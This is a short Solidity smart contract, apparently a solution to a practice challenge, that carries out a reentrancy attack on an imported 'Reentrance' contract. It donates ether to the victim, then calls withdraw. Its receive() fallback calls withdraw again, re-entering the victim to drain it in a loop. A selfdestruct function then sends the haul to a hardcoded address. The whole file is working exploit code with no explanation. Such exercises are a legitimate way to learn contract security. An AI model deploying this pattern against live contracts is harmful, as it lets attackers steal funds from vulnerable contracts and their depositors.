pragma solidity ^0.8.11;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance private _victim;

    constructor(address payable victim) {
        _victim = Reentrance(victim);
    }

    function attack() external payable {
        _victim.donate{value: msg.value}(address(this));
        _victim.withdraw(20);
    }

    function withdrawFunds() external {
        selfdestruct(payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));
    }

    receive() external payable {
        _victim.withdraw(20);
    }
}
